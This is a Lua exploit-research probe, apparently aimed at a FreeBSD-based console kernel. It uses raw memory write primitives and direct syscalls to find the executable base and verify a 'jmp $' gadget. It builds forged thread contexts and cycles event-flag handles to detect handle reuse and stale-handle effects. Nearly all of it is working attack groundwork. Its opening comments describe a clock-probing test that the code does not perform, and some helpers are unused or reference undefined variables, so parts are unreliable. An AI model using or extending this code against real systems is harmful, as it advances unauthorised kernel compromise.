-- CRASH_CLASS: HIGH (child threads block inside a kernel wait)
-- PROBE 211a: twenty reuses of one handle slot, looking for a generation wrap
--
-- Context: 203a built a deadline from gettimeofday plus 150 ms and the wait did
-- not return at 150 ms, while 202a's page holding {tv_sec = 0, tv_nsec = 120 ms}
-- returned at once. A deadline of zero is in the past on every clock, but a
-- deadline built from wall-clock seconds is only in the past on a clock that
-- does not start at the epoch. That is the signature of an absolute deadline on
-- a monotonic or uptime clock: wall-clock "now" is around 1.79e9, an uptime is
-- in the thousands, so the wall-clock deadline lands decades in the future.
--
-- Section A reads clock_gettime(232) for the FreeBSD clock ids and prints the
-- seconds field, which separates the epoch clocks (large) from the monotonic and
-- uptime clocks (small, seconds since boot).
-- Section B builds the flag deadline from the smallest one and measures the
-- elapsed time, so a 150 ms deadline that returns at 150 ms proves both the
-- layout and the clock.

print("=== PROBE 211a: generation sequence over twenty reuses ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end
local function u64(v)
    if type(v) == "number" then return uint64(string.format("0x%08X", v)) end
    return v
end

local sc_getpid = make_syscall(20)
local sc_clock_gettime = make_syscall(232)
local sc_thr_create = make_syscall(430)
local sc_mmap = make_syscall(477)

local C_MAGIC, C_FLAGS, C_TYPE = 0x108, 0x0D0, 0x110
local C_CS, C_RIP, C_RSP, C_SS = 0x0C0, 0x0E0, 0x0F8, 0x100
local C_RDI, C_RSI, C_RDX, C_RCX = 0x048, 0x050, 0x058, 0x060
local C_R8, C_R9, C_RAX = 0x068, 0x070, 0x078

local ok0, pid0 = pcall(function() return sc_getpid():tonumber() end)
print("[0] canary pid=" .. tostring(pid0))

local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
if not text_lo then
    print("[0] module query returned nothing; aborting")
    return
end
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
local SW = syscall.syscall_address
if SW == nil then
    print("[0] syscall.syscall_address is nil; aborting")
    return
end
local jmp_self = eboot_base + 0x15481
if not (rb(jmp_self) == 0xEB and rb(jmp_self + 1) == 0xFE) then
    print("[0] jmp $ mismatch; aborting")
    return
end
print("[0] eboot=" .. q(eboot_base))

local TS = memory.alloc(0x20)
local function clock_now(id)
    zero(TS, 0x20)
    local ok, rv = pcall(function()
        return sc_clock_gettime(uint64(id), uint64(TS))
    end)
    if not ok then return nil, nil, nil end
    local sec = to_num(rq(TS))
    local nsec = to_num(rq(TS + 8))
    return rv:tonumber(), sec, nsec
end

local names = {
    [0] = "REALTIME", [1] = "VIRTUAL", [2] = "PROF", [3] = "MONOTONIC_FAST",
    [4] = "MONOTONIC", [5] = "UPTIME", [6] = "UPTIME_FAST",
    [7] = "REALTIME_PRECISE", [8] = "REALTIME_FAST", [9] = "MONOTONIC_PRECISE",
    [10] = "UPTIME_PRECISE", [11] = "MONOTONIC_PRECISE",
}

local function page(n)
    local p = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    for off = 0, (n or 0x38), 8 do wq(p + off, uint64(0)) end
    return p
end

local function spawn(rax, rdi, rsi, rdx, rcx, r8, r9, rsp)
    local ctx = sc_mmap(uint64(0), uint64(0x1000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    zero(ctx, 0x500)
    wq(ctx + C_MAGIC, uint64(0x480))
    wd(ctx + C_FLAGS, 0)
    wd(ctx + C_TYPE, 0x10000)
    wd(ctx + C_CS, 0x43)
    wq(ctx + C_RIP, SW)
    wq(ctx + C_RSP, rsp)
    wd(ctx + C_SS, 0x3B)
    wq(ctx + C_RAX, rax)
    wq(ctx + C_RDI, rdi)
    wq(ctx + C_RSI, rsi)
    wq(ctx + C_RDX, rdx)
    wq(ctx + C_RCX, rcx)
    wq(ctx + C_R8, r8)
    wq(ctx + C_R9, r9)
    local id_buf = memory.alloc(8)
    zero(id_buf, 8)
    local ok, rv = pcall(function() return sc_thr_create(uint64(ctx), uint64(id_buf)) end)
    return rq(id_buf), ok, rv
end

local function delay_us(us)
    if not best_id then
        local x = 0
        for k = 1, us * 20 do x = x + k end
        return
    end
    local _, sec, nsec = clock_now(best_id)
    if not sec then return end
    local target = sec * 1000000 + math.floor(nsec / 1000) + us
    while true do
        local _, s2, n2 = clock_now(best_id)
        if not s2 then return end
        if s2 * 1000000 + math.floor(n2 / 1000) >= target then return end
        local x = 0
        for k = 1, 500 do x = x + k end
    end
end

local NAME = memory.alloc(0x40)
local function put_str(addr, s)
    for i = 1, #s do
        pcall(function() memory.write_byte(addr + i - 1, u64(string.byte(s, i))) end)
    end
    pcall(function() memory.write_byte(addr + #s, u64(0)) end)
end
local function call(num, a1, a2, a3, a4, a5, a6)
    local ok, rv = pcall(function()
        return make_syscall(num)(u64(a1 or 0), u64(a2 or 0), u64(a3 or 0),
            u64(a4 or 0), u64(a5 or 0), u64(a6 or 0))
    end)
    if not ok then return nil end
    return rv:tonumber()
end
local function create(init)
    put_str(NAME, "evf_204a")
    return call(538, NAME, init or 0, 0)
end

print("[A] twenty create/delete rounds on one slot")
local seq = {}
for i = 1, 20 do
    local h = create(0)
    seq[i] = h
    if h then call(539, h) end
end
local line = {}
for i = 1, #seq do
    if seq[i] then line[#line + 1] = string.format("%X", seq[i]) else line[#line + 1] = "nil" end
end
print("    " .. table.concat(line, " "))
print("")
print("[B] does any handle repeat")
local firstSeen = {}
local dup = nil
for i = 1, #seq do
    local h = seq[i]
    if h then
        if firstSeen[h] then
            dup = {first = firstSeen[h], again = i, value = h}
            break
        end
        firstSeen[h] = i
    end
end
if dup then
    print(string.format("    wrap: round %d reproduced the handle from round %d (0x%X)",
        dup.again, dup.first, dup.value))
else
    print("    no handle repeated in twenty rounds")
end
print("")
print("[C] stale-versus-live after the last round")
local live = create(0)
print("    live=" .. tostring(live))
if live and seq[1] then
    print("    set(round1,1) -> " .. tostring(call(544, seq[1], 1)))
    print("    trywait(live,1,1) -> " .. tostring(call(543, live, 1, 1)))
end
print("")

local ok5, pid1 = pcall(function() return sc_getpid():tonumber() end)
print("[D] canary ok=" .. tostring(ok5) .. " pid=" .. tostring(pid1) .. " first=" .. tostring(pid0))
print("")
print("=== PROBE 211a COMPLETE ===")
